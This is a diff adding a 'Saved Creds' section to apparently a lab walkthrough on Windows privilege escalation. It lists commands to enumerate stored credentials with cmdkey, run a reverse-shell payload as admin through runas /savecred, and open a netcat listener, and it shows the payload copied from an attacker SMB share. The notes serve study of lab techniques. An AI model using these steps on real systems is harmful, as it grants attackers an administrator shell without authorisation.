@@ -1178,8 +1178,80 @@ copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
 
 
 - <details>
-     <summary></summary>
+     <summary>Saved Creds</summary>
+
+     ## 1. View stored Credentials
+     
+     ```ruby
+     cmdkey /list
+     ```
+     
+     - **`cmdkey`** : A built-in Windows tool for managing Stored Credentials.
+     - **`/list`** : display all credentials Saved in the system.
+     
+     <img width="624" height="286" alt="image" src="https://github.com/user-attachments/assets/d2523f9e-11b6-4c5c-a214-8cdb185886cb" />
+     
+     
+     > ---
+     > ### 📌 _Goal → To see if there is a user (such as admin) stored with its password in the Windows Vault._
+     > ---
+     
+     <details>
+          <summary>Note</summary>
+     
+     >[!Note]
+     > #### _**`Note that credentials for the "admin" user are saved. If they aren't, run the`**_
+     > ```ruby
+     > C:\PrivEsc\savecred.bat script
+     > ```
+     > to refresh the saved credentials.
+     
+     > ## ``savecred.bat`` → A script on the lap that forces the system to store the credential (usually owned by the admin).
+     > Objective: Make sure that the credential is registered so that we can exploit it.
+     
+          
+     </details>
+     
+     
+     ## 2. run payload using saved credential
+     
+     ```ruby
+     runas /savecred /user:admin C:\PrivEsc\reverse.exe
+     ```
+     
+     - **`runas`** : Tool to run programs as different user
+     - **`/savecred`** : It means use the credential stored in the system instead of asking you to enter the password.
+     - **`/user:admin`** : Specify that you want to run the program as a user named admin.
+     - **`C:\PrivEsc\reverse.exe`** : This is your payload (reverse shell).
+     
+     
+     > ---
+     > ### 📌 _Goal → Run reverse.exe with admin privileges without entering the password yourself → take a shell with higher privileges._
+     > ---
+     
+     
+     ## 3. open listener on kali
+     
+     ```ruby
+     nc -nvlp 4444
+     ```
+     
+     
+     
+     <img width="1265" height="315" alt="image" src="https://github.com/user-attachments/assets/f1595237-ce9c-4b71-baa1-383a14ee2106" />
+     
+     
+
+
+
   </details>
+
+
+
+
+
+
+
 
 
 - <details>
